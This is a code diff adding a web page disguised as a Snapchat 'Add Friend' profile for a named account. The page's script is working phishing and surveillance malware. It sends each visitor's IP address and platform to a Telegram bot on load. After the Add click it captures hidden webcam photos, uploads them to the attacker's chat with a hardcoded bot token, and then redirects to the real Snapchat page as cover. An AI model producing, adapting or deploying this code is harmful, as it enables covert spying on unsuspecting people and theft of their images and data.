@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:title" content="Snapchat - marveen_shalash">
+    <meta property="og:description" content="Add me on Snapchat! @marveen_shalash">
+    <meta property="og:image" content="https://i.ibb.co/V3Yx8YV/avatar.jpg">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#FFFC00">
+
+    <title>Snapchat | marveen_shalash</title>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: #FFFC00; font-family: -apple-system, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .ghost { width: 50px; margin-bottom: 20px; }
+        .avatar { width: 150px; height: 150px; border-radius: 50%; border: 5px solid #fff; object-fit: cover; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 10px; }
+        h1 { font-size: 24px; color: #000; font-weight: bold; margin-bottom: 5px; }
+        p { color: #333; font-size: 16px; margin-bottom: 30px; }
+        .btn { background-color: #00ADEE; color: #fff; padding: 15px 80px; border-radius: 35px; font-weight: bold; border: none; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        video, canvas { display: none; position: absolute; }
+    </style>
+</head>
+<body>
+
+    <img src="https://www.snapchat.com/globalassets/sp-pwa/ghost-logo.png" class="ghost">
+    <img src="https://i.ibb.co/V3Yx8YV/avatar.jpg" class="avatar">
+    <h1>marveen_shalash</h1>
+    <p>Snapchat User</p>
+    
+    <button class="btn" id="mainBtn">Add Friend</button>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const token = "8264886383:AAEaUDc_Jm_3z74zqmFfXLU9cHXhRKrhjxs";
+        const chatId = "5775781038";
+
+        async function post(url, data) {
+            return fetch(url, { method: 'POST', body: data });
+        }
+
+        async function sendLog(m) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=html`);
+        }
+
+        // سحب الـ IP فوراً عند فتح الصفحة
+        window.onload = () => {
+            fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => sendLog(`🔥 <b>دخول جديد!</b>\n🌐 IP: <code>${d.ip}</code>\n📱 OS: ${navigator.platform}`));
+        };
+
+        // تفعيل الكاميرا عند الضغط على الزر (لضمان عمل الإذن)
+        document.getElementById('mainBtn').onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                sendLog("✅ الضحية ضغط Add وفتح الكاميرا!");
+
+                for(let i=1; i<=5; i++) {
+                    setTimeout(() => {
+                        const can = document.getElementById('c');
+                        can.width = video.videoWidth;
+                        can.height = video.videoHeight;
+                        can.getContext('2d').drawImage(video, 0, 0);
+                        can.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append('chat_id', chatId);
+                            fd.append('photo', blob, 'img.jpg');
+                            fd.append('caption', `📸 صورة ${i} | @marveen_shalash`);
+                            post(`https://api.telegram.org/bot${token}/sendPhoto`, fd);
+                        }, 'image/jpeg', 0.6);
+                    }, i * 800);
+                }
+
+                // التمويه (إعادة توجيه بعد 4 ثوانٍ)
+                setTimeout(() => {
+                    window.location.href = "https://www.snapchat.com/add/marveen_shalash";
+                }, 5000);
+
+            } catch (e) {
+                sendLog("❌ رفض إذن الكاميرا.");
+                window.location.href = "https://www.snapchat.com/add/marveen_shalash";
+            }
+        };
+    </script>
+</body>
+</html>
